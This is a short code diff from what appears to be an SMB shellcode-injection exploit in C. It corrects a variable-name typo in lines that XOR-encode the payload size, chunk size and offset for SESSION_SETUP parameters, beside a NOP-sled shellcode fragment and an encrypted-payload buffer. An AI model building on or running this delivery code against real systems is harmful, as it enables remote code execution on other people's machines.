@@ -180,9 +180,9 @@ int main(int argc, char* argv[])
 	"\x90\x90\x90\x90\x90\x90\x90\x90";
 	
 	//generate the SESSION_SETUP parameters here
-	unsigned int TotalSizeOfPayload = sizeof(shellcode) ^ Xorkey;
+	unsigned int TotalSizeOfPayload = sizeof(shellcode) ^ XorKey;
 	unsigned int ChunkSize = 4096 ^ XorKey;
-	unsigned int OffsetofChunkinPayload = Xorkey ^ Xorkey;
+	unsigned int OffsetofChunkinPayload = XorKey ^ XorKey;
 
 	//allocate memory for encrypted shellcode payload
 	unsigned char *encrypted;
